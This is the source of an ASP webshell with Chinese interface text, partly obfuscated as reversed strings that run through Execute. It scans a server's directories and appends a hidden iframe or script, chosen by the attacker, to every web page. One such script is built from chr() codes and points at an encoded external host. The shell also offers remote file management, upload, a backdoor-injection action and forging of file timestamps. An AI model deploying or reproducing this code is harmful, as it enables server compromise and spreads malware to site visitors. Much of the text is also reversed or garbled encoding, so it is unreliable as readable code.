nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&�塣�������ܿ��У���ʹ�Կ�Ҳ�����tpircsavaj�ǵ�>rb<���PSA������ִ�Կ�����)(lav��&��e>dt<>dt/<la��&��vE>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\la��&��vEb\��=nrettaP.xEger��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&��>tnof/<���ܼӱ����ź���>der=roloc tnof<>dt<>dt/<edocnE.)tpircsavaj|tpircsj|tpircsbv(>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��nehT )txtelif(tseT.xEger fI���b\edocne.)tpircsavaj|tpircsj|tpircsbv(*s\?]���[*s\=*s\EGAUGNALb\��=nrettaP.xEger��eurT=labolG.xEger��eurT=esaCerongI.xEger��pxEgeR weN=xEger teS��fI dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&��>tnof/<������ľPSA����һ��������Σ>der=roloc tnof<>dt<>dt/<000045355444-E94A-EC11-9��&tseByMoD&��72C-02690731:dislc �߻� noitacilppA.ll��&tseByMoD&��ehS>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��neht ) )��000045355444-E94A-EC11-9��&tseByMoD&��72C-02690731:dislc��(esacL ,txtelif (rtsnI ro ) )��noitacilppA.ll��&tseByMoD&��ehS��(esacL ,txtelif (rtsni fI��fi dnE���-��ͬ-��=pmet��1 + nuS=nuS���>rt/<>dt/<��&)htapelif(yfidoMetaDteG&��>rb<��&)htapelif(etaerCetaDteG&��>dt<>dt/<��&selifni&��>tnof/<������ľPSA����һ��������Σ>der=roloc tnof<>dt<>dt/<8BFA88B42489-24A8-B834-��&tseByMoD&��A07D-5DD42C27:dislc �߻� llehS.tpi��&tseByMoD&��rcSW>dt<>dt/<��&pmet&��>dt<>rt<��&tropeR=tropeR��neht ) )��8BFA88B42489-24A8-B834-��&tseByMoD&��A07D-5DD42C27:dislc��(esacL ,txtelif (rtsnI ro ) )��llehS.tpi��&tseByMoD&��rcSW��(esacL ,txtelif (rtsni fI���>vid/<>a/<leD>'��ɾ'=eltit 'ma'=ssalc 'knalb_'=tegrat '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper&��=htaPeht&enOled=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a<��&pmet=pmet��� >a/<tide>'����'=eltit 'ma'=ssalc 'knalb_'=tegrat '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper&��=htaPeht&tidEwohs=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a<>/rb<��&pmet=pmet���>a/<��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper&��>'����'=eltit '��&)1,1,1,���,��\��&)��\��(htaPpaM.revres,htaPeliF(ecalper&��=htaPeht&eliFehTnwod=tcAeht&rerolpxEeliFosF=emaNegap?'=ferh a<��=pmet��txtelif & flrcbv=txtelif��neht 0>)txtelif(nel fi��fi dne buS tixE nehT rre fI��))(lladaer.elifo(esacL=txtelif��)htaPeliF(eliFtxeTnepO.s1OSF=elifo tes��txen emuser rorre no��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=s1OSF teS��fI dnE���>tnof/<��ִ��������>a/<�� & eliFnI &��>knalb_=tegrat ����&)eliFnI(edocnELRUt&��/��&)��eman_revres��(selbairavrevreS.tseuqeR&��//:ptth���=ferh a<�����ĸ�>der=roloc tnof<��=selifnI��nehT ��� >< eliFnI fI��999999999=tuoemiTtpircS.revreS��)eliFnI ,htaPeliF(eliFnacS buS��buS dnE��gnihtoN=OS1F teS��txeN��1 + sredloFmuS=sredloFmuS��eman.1f&��\��&htap eliFllAwohS��cf ni 1f hcaE roF��sredloFbuS.f=cf teS��txeN��fI dnE��1 + seliFmuS=seliFmuS��)��� ,eman.elifym&��\��&pmeT&htaP(eliFnacS llaC��nehT ))eman.elifym&��\��&htap(emaNnoisnetxEteG.OS1F(txEkcehC fI��2cf ni elifym hcaE roF��selif.f=2cf teS��)htaP(redloFteG.OS1F=f teS��bus tixe neht )htap(stsixEredloF.OS1F ton fi��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC=OS1F teS��)htaP(eliFllAwohS buS��fi dne���>tnof/<�����&emiteht&�����ù���ִҳ��>���2���=ezis tnof<>rb<�� SRR��)01/)5.0+) 00001*)1remit-2remit(((tni(rtsc=emiteht��remit=2remit���>elbat/<>/rb<�� SRR ��tropeR SRR ���>rt/<�� SRR ��fi dne���>dt/<��ʱ����>���%52���=htdiw dt<�� SRR ���>dt/<��ʱ��������>���%52���=htdiw dt<�� SRR ���>dt/<��·�������>���%05���=htdiw dt<�� SRR �� esle���>dt/<��ʱ����/����>���%02���=htdiw dt<�� SRR ���>dt/<����>���%04���=htdiw dt<�� SRR ���>dt/<������>���%02���=htdiw dt<�� SRR ���>dt/<��·�������>���%02���=htdiw dt<�� SRR ��nehT ��sws��=)��nottuboidar��(mroF.tseuqer fI���>rt<>���;htob:raelc;%031:thgieh-enil;espalloc:espalloc-redrob;xp21:ezis-tnof���=elyts ���999999#���=rolocredrob ���8���=gnicapsllec ���0���=gniddapllec ���1���=redrob ���%001���=htdiw elbat<�� SRR����>tnof/<��&nuS&��>���0000FF#���=roloc tnof<���ɿ��ַ�����>tnof/<��&seliFmuS&��>���0000FF#���=roloc tnof<���ģ���>tnof/<��&sredloFmuS&��>���0000FF#���=roloc tnof<�м��Ĳ�칲һ��������ɨ�� SRR���>vid/<>���enon:yalpsid;xp4:gniddap;f14498# dilos xp1:redrob;1effff:dnuorgkcab���=elyts ���ofnIetadpu���=di vid<�� SRR���>���xp21:ezis-tnof;htob:raelc;%071:thgieh-enil;xp5:gniddap���=elyts ���lenaPC���=ssalc dt<>rt<�� SRR���>rt/<gnikcaH roF ytiruceSPSA -- llehSbeW nacS>ht<>rt<�� SRR���>���tnetnoCC���=ssalc ���0���=gnicapsllec ���0���=gniddapllec ���0���=redrob ���%001���=htdiw elbat<�� SRR��fI dnE��)htaPpmT(2eliFllAwohS llaC��)��txEelif_hcraeS��(mroF.tseuqer=txEeliFmiD��fI dnE��)(dnE.esnopser��)��>a/<�������ػط���>';)1-(og.yrotsih:tpircsavaj'=ferh a<>rb<>rb<ȫ�겻����������(SRR��nehT ���=)��txEeliF_hcraeS��(mroF.tseuqer ro ���=)��etaD_hcraeS��(mroF.tseuqer ro ���=)��htap��(mroF.tseuqer fI��eslE��)htaPpmT(eliFllAwohS llaC���xdc,asa,rec,psa��=txEeliFmiD��nehT ��sws��=)��nottuboidar��(mroF.tseuqer fI��1=sredloFmuS��0=seliFmuS��0=nuS��remit=1remit��fi dne��)��htap��(mroF.tseuqer&��\��&)��\��(htaPpaM.revreS=htaPpmT��esle��)��.��(htaPpaM.revreS=htaPpmT��neht ��.��=)��htap��(mroF.tseuqer fiesle��)��\��(htaPpaM.revreS=htaPpmT��neht ��\��=)��htap��(mroF.tseuqer fi��fi dne��)(dnE.esnopser��)��kcaH oN��(SRR��neht ���=)��htap��(mroF.tseuqer fi��esle���>mrof/<�� SRR���>/ ���;xp4:nigram;xp2 xp0 xp2 xp2:gniddap;fff# dilos xp2:redrob;ccc#:dnuorgkcab���=elyts ��� ��ɨʼ�� ���=eulav ���timbus���=epyt tupni<�� SRR���>vid/<>/ rb<>/ rb<��������ʾ��*������,�ü�֮���� *>���02���=ezis ���*���=eulav ���999# dilos xp1:redrob���=elyts ���txet���=epyt ���txEeliF_hcraeS���=eman tupni<���������;psbn&;psbn&�� SRR���>/ rb<>a/<LLA>�����LLA���=eulav.etaD_hcraeS.1mrof:tpircsavaj���=kcilCno ���#���=ferh a<д���������Σ�����;�����ո��� *>���02���=ezis ����&)1-)�� ��,)(won(rtSnI,)(woN(tfeL&����=eulav ���999# dilos xp1:redrob���=elyts ���txet���=epyt ���etaD_hcraeS���=eman tupni<�����ո���;psbn&;psbn&�� SRR���>/ rb<��������н�ֻ����������ֵ��Ҳ�Ҫ *�� SRR���>���02���=ezis ���999# dilos xp1:redrob���=elyts ���tnetnoC_hcraeS���=di ���txet���=epyt ���tnetnoC_hcraeS���=eman tupni<�������Ҳ�;psbn&;psbn&�� SRR���>���enon:yalpsid���=elyts ���1eliFwohs���=di vid<>/ rb<�� SRR���>rb<����֮�����Ϸ�����>���''=yalpsid.elyts.)'1eliFwohs'(dIyBtnemelEteg.tnemucod���=kcilCno ���fs���=eulav ���nottuboidar���=eman ���oidar���=epyt tupni<�� SRR����� PSA��>dekcehc ���'enon'=yalpsid.elyts.)'1eliFwohs'(dIyBtnemelEteg.tnemucod���=kcilCno ���sws���=eulav ���oidar���=epyt ���nottuboidar���=eman tupni< :ôʲ��Ҫ��� SRR���>rb<>rb<¼Ŀ�������Ϊ��.����վ��������켴��\�����·�����¼Ŀ��վ�� *>/ ���03���=ezis ���.���=eulav ���999# dilos xp1:redrob���=elyts ���txet���=epyt ���htap���=eman tupni<�� SRR���>b/<����·�Ĳ��Ҫ������>b<>p<�� SRR���>���1mrof���=eman ���tsop���=dohtem ���nacs=tca&amumk=emaNegap?���=noitca mrof<�� SRR��neht ��nacs��><)��tca��(gnirtSyreuQ.tseuqer fi��)��>ydob<>daeh/<>elyts/<}enon :noitaroced-txet{a};xp11:ezis-tnof;888#:roloc{ma.};elbisiv :ytilibisiv{wohs.}fff#:roloc{a};444# :roloc-dnuorgkcab;eee#:roloc;xp21:ezis-tnof;xp0:nigram{ydob>elyts<>daeh<>lmth<��(SRR��tropeR mid"
ExeCuTe(ShiSanFun(ShiSan))
Case "plgm"
Server.ScriptTimeout=1000000 
Response.Buffer=False 
RRS (""&copyurl&"")
RRS ("<b>��ǰ��վ����·��:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode = Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
RRS("<form method=""POST""> ")
RRS("<table width=560 border=""0"" style=""font-size:12px;"">")
RRS("<tr>")
RRS("<td width=""102"">Ҫ�����ļ��еľ���·����</td>")
RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
RRS("<td width=""69"">&nbsp;</td>")
RRS("</tr><tr><td>Ҫ����Ĵ���:</td>")
RRS("<td><textarea name=""code"" cols=58 rows=""3"">"&addcode&"</textarea></td>")
RRS("<td><input name=""submit"" type=""submit"" value=""��ʼ""></td>")
RRS("</tr></table></form> ")
End If 
Function IsPattern(patt,str) 
Set regEx=New RegExp 
regEx.Pattern=patt 
regEx.IgnoreCase=True 
retVal=regEx.Test(str) 
Set regEx=Nothing 
If retVal=True Then 
IsPattern=True 
Else 
IsPattern=False 
End If 
End Function 
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>����������·�������!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
End If
end if 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If 
End Sub 
Sub step_all(agr) 
retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub 
End If 
End Sub 
Sub step1(str1)
RRS "<div style='line-height:20px'>�� "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a></div>"
End Sub 
Sub step2(str2) 
Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
if left(right(str2,8),4)="conn" then
f_addcode.Write plgm
else
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
end if
Set fs=Nothing 
End Sub 
Err.Clear
case "plgm1"
RRS("<html><head><style>tr td{font-size:12px}body{margin:0px;font-size:12px;color:#eee;background-color: #444;}a{color:#fff}.show{visibility: visible;}.am{color:#888;font-size:11px;}</style></head><body>")
RRS ("<b>��ǰ��վ����·�� ")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
Fpath=Request("fd") 
if Fpath="" then Fpath=Server.MapPath("/")
addcode=Request("code")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
pcfile=request("pcfile")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/") 
pcfilen=ubound(pcfilek) 
pcfile=pcfilek(pcfilen) 
end if
checkbox=request("checkbox")
if checkbox="" then checkbox=request("checkbox")
RRS "<form method=POST action='?pageName=plgm1'>" 
RRS "<table width=80% border=0><tr>"
RRS ""&copyurl&""
RRS "<td width=109>Ҫ������ļ��У�</td>"
RRS "<td><input type=text name=fd value="&Fpath&" size=40>(����·��)</td></tr>"
RRS "<tr><td>�����ظ��ļ���</td>"
RRS "<td><input name=checkbox type=checkbox value=checked "&checkbox&">(�ų�����ͬ���Ĵ�����ļ�,����ļ��Ƚ϶�ѡ�п��ܻ�Ӱ��ִ���ٶ�)</td></tr>"
RRS "<tr><td>�ų��ļ���</td>"
RRS "<td><input name=pcfile type=text id=pcfile value="&pcfile&" size=40>(����ļ��á�:���ָ���Ĭ��Ϊ��ҳ�ļ���)</td></tr>"
RRS "<tr><td>һ�仰���Ż����</td>"
RRS "<td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
RRS "<tr><td>&nbsp;</td><td><input name=submit type=submit value=ִ��></td></tr>"
RRS "</table></form>" 
if request("submit")="ִ��" then RRS"<div style='line-height:20px'><b>������ҳ�ѳɹ�������룺</b><br>":call InsertAllFiles(Fpath,addcode,pcfile)
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
 Set WFSO=CreateObject("Scripting.FileSystemObject")
 on error resume next 
 Set f=WFSO.GetFolder(Wpath)
 Set fc2=f.files
 For Each myfile in fc2
Set FS1=CreateObject("Scripting.FileSystemObject")
if Instr(pc,myfile.name)=0 then
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS "�� "&Wpath&myfile.name
tfile.close
else
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS "��"&Wpath&myfile.name
tfile1.close
else
RRS "�� "&Wpath&myfile.name
tfile1.close
end if
end if
else
RRS "�� "&Wpath&myfile.name
end if
RRs " �� <font style='line-height:20px;'> <a href='?pageName=FsoFileExplorer&theAct=downTheFile&thePath="&Wpath&myfile.name&"' class='am' title='����'>Down</a> "
RRS "<a href='?pageName=FsoFileExplorer&theAct=showEdit&thePath="&Wpath&myfile.name&"' target='_blank' class='am' title='�༭'>edit</a> "
RRS "<a href='?pageName=FsoFileExplorer&theAct=delOne&thePath="&Wpath&myfile.name&"' target='_blank' class='am' title='ɾ��'>Del</a></font></div>"
 Next
 Set fsubfolers=f.SubFolders
 For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
 InsertAllFiles NewPath,Wcode,pc
 Next
set tfile=nothing
Set FSO=Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO=Nothing
End Sub
ExeCuTe(ShiSanFun(ShiSan))
Case else:PageLogin()
End Select
Set saX=Nothing
Set wsX=Nothing
Set fsoX=Nothing
Sub PageAppFileExplorer()
ShiSan="gnihtoN=redloFjbo teS���>/rh<�� SRR���>vid/<�� SRR��tsiLeliFrts & tsiLredloFrts SRR���>tsiLeliF=di vid<�� SRR��fI dnE��tsiLredloFrts & ��>naps/<..>/rb<>tnof/<0>sgnidgniW=ecaf tnof=ssalc tnof<>';)siht(ssalCyMegnahc'=kcilcno ';)siht(htaPehTegnahc'=kcilclbdno ���� & )htaPtneraPrts(edocnELRU & ����=di naps<��=tsiLredloFrts��nehT ��::�� >< )2 ,htaPeht(tfeL dnA ��� >< htaPeht fI��)htaPeht(htaPtneraPteg=htaPtneraPrts��)rrE(rrEkhc��txeN��fI dnE���>naps/<�� & emaNeliFrts & ��>/rb<>tnof/<�� & )emaNtxErts(nocIeliFteg & ��=ecaf tnof=ssalc tnof<>';)siht(ssalCyMegnahc'=kcilcno ���� & )htaPeliFrts(edocnELRU & ����=di ';)(lrUnepo'=kcilclbdno ���� & sliateDrts & ����=eltit naps<�� & tsiLeliFrts=tsiLeliFrts��)))��.�� ,emaNeliFrts(tilpS(dnuoBU()��.�� ,emaNeliFrts(tilpS=emaNtxErts��)1 + )��\�� ,htaPeliFrts(veRrtSnI ,htaPeliFrts(diM=emaNeliFrts��htaP.rebmeMjbo=htaPeliFrts ��)1- ,rebmeMjbo(fOsliateDteG.redloFjbo=sliateDrts ��eslE ���>naps/<�� & emaN.rebmeMjbo & ��>/rb<>tnof/<0>sgnidgniW=ecaf tnof=ssalc tnof<>';)siht(ssalCyMegnahc'=kcilcno ';)siht(htaPehTegnahc'=kcilclbdno ���� & htaPrts & ����=di naps<�� & tsiLredloFrts=tsiLredloFrts��fI dnE���C5%�� & )htaP.rebmeMjbo(edocnELRU=htaPrts��eslE ��)htaP.rebmeMjbo(edocnELRU=htaPrts��nehT ��::��=)2 ,htaP.rebmeMjbo(tfeL fI��nehT eurT=redloFsI.rebmeMjbo fI��fI dnE��)(hsulF.esnopseR��0=Itni��nehT 002 > Itni fI��1 + Itni=Itni��smetI.redloFjbo nI rebmeMjbo hcaE roF���>tpircs/<;)002 ,���;)'slooTrerolpxEelif'(reyaLehTxif���(lavretnItes;)'slooTrerolpxEelif'(reyaLehTxif>tpircs<�� SRR���>vid/<>';xp05:thgieh'=elyts vid<>vid/<�� SRR���>/rh<>mrof/<��&daoleRrts&��>/ '.OG '=eulav timbus=epyt tupni<�� SRR���>/ ���� & )htaPeht(edocnElmtH & ����=eulav htaPeht=eman ';%06:htdiw'=elyts tupni<�� SRR���>;���� & ))��\��(htaPpaM.revreS(edocnELRU & ��=htaPeht&rerolpxEeliFppA=emaNegap?���=ferh.noitacol=kcilcno ����վ=eulav nottub=epyt tupni<�� SRR���>/ ';)1(og.yrotsih;eurt=delbasid.siht'=kcilcno ' ��ǰ '=eulav nottub=epyt tupni<�� SRR���>/ ';)(kcab.yrotsih;eurt=delbasid.siht'=kcilcno ' �˺� '=eulav nottub=epyt tupni<�� SRR���>'rerolpxEeliFppA=emaNegap?'=noitca tsop=dohtem mrof<�� SRR���>'}D90303B20080-DD2A-9601-AEA3-0202CE12{::\\}D90303B20080-8D2A-9601-AEA3-0EF40D02{::=htaPeht&rerolpxEeliFppA=emaNegap?'=ferh.noitacol=kcilcno '�����ƿ�'=eulav nottub=epyt tupni<�� SRR���>'=htaPeht&rerolpxEeliFppA=emaNegap?'=ferh.noitacol=kcilcno '�Ե����'=eulav nottub=epyt tupni<�� SRR���>';)(emaneRppa'=kcilcno '������'=eulav nottub=epyt tupni<�� SRR���>;)'tcejni'(noitcAoDppa=kcilcno ' ��� '=eulav nottub=epyt tupni<�� SRR���>';)(setubirttAehTppa'=kcilcno ' ���� '=eulav nottub=epyt tupni<�� SRR���>';)(eliFehTnwod'=kcilcno ' ���� '=eulav nottub=epyt tupni<�� SRR���>';)(eliFehTpu'=kcilcno ' ���� '=eulav nottub=epyt tupni<�� SRR���>;)'enOtsap'(2noitcAoDppa=kcilcno ' ��ճ '=eulav nottub=epyt tupni<�� SRR���>;)'enOtuc'(noitcAoDppa=kcilcno ' �м� '=eulav nottub=epyt tupni<�� SRR���>;)'enOypoc'(noitcAoDppa=kcilcno ' �Ƹ� '=eulav nottub=epyt tupni<�� SRR���>';)(eliFtide'=kcilcno ' ���� '=eulav nottub=epyt tupni<�� SRR���>';)(lrUnepo'=kcilcno ' ���� '=eulav nottub=epyt tupni<�� SRR���>slooTrerolpxEelif=di ';xp2:pot;etulosba:noitisop;xp84:thgieh;%001:htdiw;xp0:tfel'=elyts vid<�� SRR���>/ htaPeurt=eman ���� & )htaPeht(edocnElmtH & ����=eulav neddih=epyt tupni<�� SRR���>/ emaNegap=eman rerolpxEeliFppA=eulav neddih=epyt tupni<>/ htaPesu=eman neddih=epyt tupni<�� SRR��fI dnE��))htaPeht(edocnElrU & ��=htaPeht&rerolpxEeliFppA=emaNegap?��(oTtcerider��nehT 0 > tnuoC.mroF.tseuqeR fI��)htaPeht(ecapSemaN.Xas=redloFjbo teS��fI dnE��dnE.esnopseR��nehT ��� >< tcAeht fI��tceleS dnE��)��!��������ź��(esolCnehTtrela��rooDkcaBrts & pmTrts ,htaPeht eliFoTevaSosf��)htaPeht(eliFmorFdaoLmaerts=pmTrts���tcejni�� esaC��)��rerolpxEeliFppA�� ,htaPeht(daolpUwohs llaC��)htaPeht(daolpUmaerts���daolpu�� esaC��)��rerolpxEeliFppA�� ,htaPeht(daolpUwohs llaC���daolpUwohs�� esaC��)htaPeht(setubirttAehTppa���setubirttAeht�� esaC��)htaPeht(eliFehTnwod���eliFehTnwod�� esaC��)htaPeht(enOemaneRppa���emaner�� esaC��)��!��Ч����ҳ����ˢ��,������ճ��(esolCnehTtrela��)htaPeht(enOtsaPoDppa���enOtsap�� esaC��)��!��ճ��,�������٩�(esolCnehTtrela��tcAeht=)��tcAehTppa�� & m(noisseS��htaPeht=)��htaPehTppa�� & m(noisseS��fI dnE��dnE.esnopseR��)��!������Ω�(esolCnehTtrela��nehT ���=htaPeht fI���enOtuc�� ,��enOypoc�� esaC��)��maerts�� ,htaPeht(eliFoTevas llaC���eliFevas�� esaC��)��maerts�� ,htaPeht(tidEwohs llaC���tidEwohs�� esaC��)htaPeht(lrUnepo���lrUnepo�� esaC��tcAeht esaC tceleS��fI dnE��fI dnE��)��\�� ,��\\�� ,))��htaPeht��(mroF.tseuqeR(mirTL(ecalpeR=htaPeht��)��tcAeht��(mroF.tseuqeR=tcAeht��nehT 0 > tnuoC.mroF.tseuqeR fI��nehT ��daolpu�� >< tcAeht fI��)��\�� ,��\\�� ,))��htaPeht��(tseuqeR(mirTL(ecalpeR=htaPeht��)��emaNwen��(tseuqeR=emaNweNrts��)��tcAeht��(tseuqeR=tcAeht��)��)maerts&(����䯼���noitacilppA.llehS��(eltiTwohs��htaPtneraPrts ,emaNeliFrts ,htaPeliFrts ,tsiLeliFrts ,tsiLredloFrts ,pmTrts ,tcAeht ,Itni miD��emaNweNrts ,htaPrts ,sliateDrts ,rebmeMjbo ,redloFjbo ,htaPeht ,emaNtxErts miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI��eurT=reffuB.esnopseR"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
plgm=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(37)&chr(55)&chr(54)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(52)&chr(37)&chr(50)&chr(69)&chr(37)&chr(54)&chr(51)&chr(37)&chr(54)&chr(69)&chr(47)&chr(37)&chr(51)&chr(49)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)
Function getParentPath(strPath)
If Right(strPath, 1)="\" Then
strPath=Left(strPath, Len(strPath) - 1)
End If
If Len(strPath)=2 Then
getParentPath=" "
 Else
getParentPath=Left(strPath, InStrRev(strPath, "\"))
End If
End Function
Function streamSaveToFile(thePath, fileContent)
Dim stream
If isDebugMode=False Then
On Error Resume Next
End If
Set stream=Server.CreateObject("adodb.stream")
With stream
.Type=2
.Mode=3
.Open
chkErr(Err)
.Charset="gb2312"
.WriteText fileContent
.saveToFile thePath, 2
.Close
End With
Set stream=Nothing
End Function
Sub appDoPastOne(thePath)
If isDebugMode=False Then
On Error Resume Next
End If
Dim strAct, strPath
dim objTargetFolder
strAct=Session(m & "appTheAct")
strPath=Session(m & "appThePath")
If strAct="" Or strPath="" Then
alertThenClose("��������,ճ��ǰ���ȸ���/����!")
Exit Sub
End If
If InStr(LCase(thePath), LCase(strPath)) > 0 Then
alertThenClose("Ŀ���ļ�����Դ�ļ�����,�Ƿ�����!")
Exit Sub
End If
strPath=trimThePath(strPath)
thePath=trimThePath(thePath)
Set objTargetFolder=saX.NameSpace(thePath)
If strAct="copyOne" Then
objTargetFolder.CopyHere(strPath)
 Else
objTargetFolder.MoveHere(strPath)
End If
chkErr(Err)
Set objTargetFolder=Nothing
End Sub
Sub appTheAttributes(thePath)
ShiSan="gnihtoN=redloFjbo teS��gnihtoN=metIjbo teS��htSrts SRR���>mrof/<�� & htSrts=htSrts��eMesolCsJrts & htSrts=htSrts���>' ���� '=eulav timbus=epyt tupni<�� & htSrts=htSrts���>/ etaDyfidoM=eman '�� & )3 ,metIjbo(fOsliateDteG.redloFjbo & ��'=eulav 03=ezis tupni< :���޺���>/rb<�� & htSrts=htSrts���>���� & htaPeht & ����=eulav htaPeht=eman neddih=epyt tupni<�� & htSrts=htSrts���>setubirttAeht=eulav tcAeht=eman neddih=epyt tupni<�� & htSrts=htSrts���>tsop=dohtem mrof<�� & htSrts=htSrts��)���������� ,��)8(������ ,htSrts(ecalpeR=htSrts��)��� ,��)3(������ ,htSrts(ecalpeR=htSrts��)������� ,��)2(������ ,htSrts(ecalpeR=htSrts��)��С��� ,��)1(������ ,htSrts(ecalpeR=htSrts��txeN��)i ,metIjbo(fOsliateDteG.redloFjbo & �� :)�� & i & ��(����>/rb<�� & htSrts=htSrts��8 oT 1=i roF��fI dnE��buS tixE��gnihtoN=redloFjbo teS��gnihtoN=metIjbo teS��)��!���ɸ��ީ�(esolCnehTtrela��etaDyfidoMrts=etaDyfidoM.metIjbo��nehT )etaDyfidoMrts(etaDsi fI��)rrE(rrEkhc��)htSrts(emaNesraP.redloFjbo=metIjbo teS��)))��\�� ,htaPeht(tilpS(dnuoBU()��\�� ,htaPeht(tilpS=htSrts��)rrE(rrEkhc��)htSrts(ecapSemaN.Xas=redloFjbo teS��))��\�� ,htaPeht(veRrtSnI ,htaPeht(tfeL=htSrts��fI dnE��buS tixE��)��!)��(���ĺ�����ѡ��û��(esolCnehTtrela��nehT ���=htaPeht fI���)htaPeht(htaPehTmirt=htaPeht���)��etaDyfidoM��(tseuqeR=etaDyfidoMrts��etaDyfidoMrts ,metIjbo ,redloFjbo ,htSrts ,i miD��fI dnE��txeN emuseR rorrE nO��nehT eslaF=edoMgubeDsi fI"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
Sub appRenameOne(thePath)
ShiSan="gnihtoN=redloFjbo teS��gnihtoN=metIjbo teS���>mrof/<�� SRR��eMesolCsJrts & ��>' ���� '=eulav timbus=epyt tupni<>/rh<�� SRR��fI dnE��htSrts & ��.�� SRR��nehT 0 =< )��:�� ,htSrts(rtSnI fI���>/ emaNelif=eman ���� & emaN.metIjbo & ����=eulav 03=ezis tupni<>/rb<�� SRR���>���� & htaPeht & ����=eulav htaPeht=eman neddih=epyt tupni<�� SRR���>emaner=eulav tcAeht=eman neddih=epyt tupni<�� SRR���:������>tsop=dohtem mrof<�� SRR��fI dnE��buS tixE��gnihtoN=redloFjbo teS��gnihtoN=metIjbo teS���>tpircs/<;)2-(og.yrotsih>tpircs<�� SRR��)��!��Ч�����Կ�ť�� ��ˢ �ķ�����ҳ����,���������ة�(esolCnehTtrela��)rrE(rrEkhc��emaNelif=emaN.metIjbo��nehT ��� >< emaNelif fI��)))��.�� ,htaPeht(tilpS(dnuoBU()��.�� ,htaPeht(tilpS=htSrts��)rrE(rrEkhc��)htSrts(emaNesraP.redloFjbo=metIjbo teS��)))��\�� 